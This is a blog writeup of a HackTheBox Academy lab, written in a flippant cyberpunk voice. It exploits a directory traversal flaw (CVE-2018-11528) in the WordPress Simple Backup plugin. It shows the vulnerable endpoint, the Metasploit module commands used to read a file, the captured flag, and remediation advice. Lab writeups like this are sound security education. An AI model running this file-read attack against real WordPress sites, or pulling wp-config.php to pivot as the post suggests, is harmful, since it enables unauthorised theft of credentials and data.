---
title: "Ghosthermes’ First Blood: Popping the Simple Backup Plugin on WordPress (HTB Academy Lab Writeup)"
seoTitle: "Ghosthermes’ HackTheBox Writeup: Exploiting WordPress Simple Backup"
seoDescription: "Dive into ghosthermes’ first Hashnode post where a HackTheBox Academy lab meets real-world vulnerability disclosure. Learn how a trivial directory traversal"
datePublished: Thu May 15 2025 22:55:49 GMT+0000 (Coordinated Universal Time)
cuid: cmapyxbg4000r08la2kd47yyc
slug: ghosthermes-first-blood-popping-the-simple-backup-plugin-on-wordpress-htb-academy-lab-writeup
tags: pentesting, web-security, vulnerability, hackthebox, cybersecurity-1, websecurity, metasploit, bugbounty, directorytraversal, wordpress-security, vulnerabilitydisclosure, ghosthermes

---

**Author:** Liz Zelda Fallstar (aka ghosthermes)  
**Date:** Thursday, May 15, 2025

---

---

## Introduction: Hacking in the Ruins of the Internet

Welcome to the first official chronicle of my bug bounty journey-a tale of exploitation, disclosure, and the slow, beautiful entropy of the internet. I’m Liz Zelda Fallstar, but you can call me ghosthermes: freelance hacker, AI wrangler, and reluctant priestess of the coming digital apocalypse. Today’s sermon is about a classic: abusing a WordPress plugin so old it practically predates hope.

Why am I doing this? Because it’s cool. Because the only way to resolve the contradictions of late-stage internet capitalism is to poke holes in it until it collapses under its own weight. And because, let’s face it, writing up a HackTheBox Academy lab as a VDP is the new black.

---

## The Target: Simple Backup Plugin (a.k.a. “Please, Hack Me”)

* **Target:** [`http://94.237.59.174:47722`](http://94.237.59.174:47722)
    
* **Vuln:** Arbitrary File Read / Directory Traversal
    
* **Plugin:** Simple Backup 2.7.10
    
* **CVE:** [CVE-2018-11528](https://nvd.nist.gov/vuln/detail/CVE-2018-11528)
    

---

## Recon: Enumeration in the Land of the Blind

Armed with nothing but an IP and port, I did what any self-respecting hacker does: poked at it until something screamed. A quick nmap and some browser sleuthing revealed an ancient WordPress install, running the Simple Backup plugin-an artifact so vulnerable it should be in a museum, or at least behind a firewall.

Plugin files were lounging at:

```plaintext
/wp-content/plugins/simple-backup/
```

And the `readme.txt` (because why not advertise your weaknesses?) told me backups lived in `/simple-backup/` at the webroot.

---

## Exploitation: Directory Traversal for Fun and Profit

### The Offending Endpoint

Here’s the magic trick:

```plaintext
/wp-admin/tools.php?page=backup_manager&download_backup_file=FILEPATH
```

The `download_backup_file` parameter? About as sanitized as a gas station bathroom. Directory traversal is trivial.

### Metasploit to the Rescue

Why reinvent the wheel when Metasploit already built a tank?

```bash
use auxiliary/scanner/http/wp_simple_backup_file_read
set RHOSTS 94.237.59.174
set RPORT 47722
set TARGETURI /
set FILEPATH /flag.txt
run
```

Why `/flag.txt`? Because HackTheBox loves hiding flags there, and because sometimes the best hacks are the most obvious.

### Proof of Concept

Metasploit coughed up the goods:

```plaintext
HTB{my_f1r57_h4ck}
```

And just like that, another brick in the internet’s crumbling wall falls away.

---

## Impact: Why This Matters (or, Why You Should Care)

* **Confidentiality? Gone.** Any file the web server can read is fair game. Credentials, configs, secrets-yours for the taking.
    
* **Privilege Escalation? Inevitable.** Grab `wp-config.php`, pivot to the database, and the world (or at least the WordPress instance) is yours.
    

---

## Remediation: How to Not Get Owned

* **Short-term:** Nuke the Simple Backup plugin from orbit. It’s the only way to be sure.
    
* **Long-term:** Validate and sanitize *everything*. Don’t trust user input. Ever.
    
* **General:** Lock down file permissions and restrict access like your digital life depends on it-because it does.
    

---

## References

* [CVE-2018-11528](https://nvd.nist.gov/vuln/detail/CVE-2018-11528)
    
* [Exploit-DB 44932](https://www.exploit-db.com/exploits/44932)
    
* [Metasploit Module Docs](https://www.rapid7.com/db/modules/auxiliary/scanner/http/wp_simple_backup_file_read/)
    

---

## Reflections: Why I Hack (and Why You Should Too)

This lab was a delightful exercise in digital vandalism for a good cause. Enumeration, exploitation, and a little bit of showmanship-what more could a trans technologist ask for? If we’re going to live in the ruins of the internet, we might as well learn how to build (and break) the walls ourselves.

Follow me for more writeups, war stories, and dispatches from the front lines of the cyberpunk dystopia. Find me on [GitHub](https://github.com/brigid-void) and [LinkedIn](https://www.linkedin.com/in/liz-fallstar-05ab93365/)\-before the internet eats itself.

---

*ghosthermes out.*

---

Support my work:  
[https://ko-fi.com/brigidvoid](https://ko-fi.com/brigidvoid)